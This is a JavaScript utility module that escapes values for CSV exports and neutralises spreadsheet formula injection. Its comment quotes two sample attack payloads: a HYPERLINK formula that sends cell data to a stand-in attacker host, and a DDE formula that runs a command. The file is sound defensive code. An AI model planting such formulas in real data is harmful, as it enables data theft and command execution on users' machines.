/**
 * ============================================================================
 * FILE: csvEscape.mjs
 * PURPOSE: Single source of truth for writing a value into a CSV cell.
 * ============================================================================
 *
 * WHY THIS EXISTS
 * ---------------
 * Four admin-reachable CSV exports had grown independently:
 *
 *   controllers/adminClientController.mjs  — had a correct RFC 4180 quoter
 *   routes/admin/adminFinanceRoutes.mjs    — interpolated raw, no quoting at all
 *   routes/adminOrdersRoutes.mjs           — added quotes but did not double
 *                                            embedded ones, so a name containing
 *                                            `"` breaks out of the cell
 *   routes/sessionRoutes.mjs               — mixed: three fields quoted without
 *                                            doubling, three not quoted at all
 *
 * None of them neutralised spreadsheet formulas. That is the same shape as the
 * HTML-escaper problem: the pattern was known, it had no shared home, so each new
 * builder re-derived it — usually as nothing.
 *
 * TWO SEPARATE PROBLEMS, OFTEN CONFLATED
 * --------------------------------------
 * 1. **CSV structure** — a value containing `,`, `"`, CR or LF must be quoted and
 *    its `"` doubled, or it silently shifts every later column.
 * 2. **Formula injection** — a spreadsheet treats a cell beginning with `=`, `+`,
 *    `-`, `@`, TAB or CR as a FORMULA. A client named
 *    `=HYPERLINK("https://evil.example?d="&A1,"Click to view invoice")` becomes a
 *    live link in the admin's Excel, and `=cmd|'/c calc'!A0` is the DDE variant.
 *    Escaping for (1) does nothing for (2): `=1+1` contains no character that
 *    triggers quoting, so it passes through a correct RFC 4180 quoter untouched.
 *
 * That second point is why this module exists rather than "the CSV writer already
 * escapes". It does not escape *for this*.
 *
 * USAGE
 * -----
 *   import { escapeCsvValue, serializeCsv } from '../utils/csvEscape.mjs';
 *
 *   const body = serializeCsv(HEADERS, rows.map((r) => HEADERS.map((h) => r[h])));
 */

/**
 * Characters that make a spreadsheet parse the cell as a formula.
 * Leading whitespace is included because some parsers trim before deciding.
 */
const FORMULA_TRIGGER = /^\s*[=+\-@\t\r]/;

/** Characters that force RFC 4180 quoting. */
const NEEDS_QUOTING = /[",\n\r]/;

/**
 * Render one value as a safe CSV cell.
 *
 * Numbers are NOT formula-prefixed: a negative number legitimately starts with
 * `-`, and turning `-5` into `'-5` would corrupt every numeric column in a finance
 * export. Only *string* values are neutralised. If a caller has a numeric string
 * from user input it is treated as a string and neutralised, which is the safe
 * direction — a spreadsheet will read `'-5` as text, and text is never executed.
 *
 * The neutraliser is a leading apostrophe, which spreadsheets treat as "this cell
 * is literal text" and do not display. That is the OWASP-recommended mitigation.
 */
export const escapeCsvValue = (value) => {
  if (value === null || value === undefined) return '';

  const isNumber = typeof value === 'number' && Number.isFinite(value);
  let text = String(value);

  if (!isNumber && FORMULA_TRIGGER.test(text)) text = `'${text}`;

  return NEEDS_QUOTING.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
};

/**
 * Serialise a header row plus data rows. CRLF-terminated per RFC 4180 §2.1.
 */
export const serializeCsv = (headers, rows) =>
  [headers.map(escapeCsvValue).join(','), ...rows.map((row) => row.map(escapeCsvValue).join(','))]
    .join('\r\n');
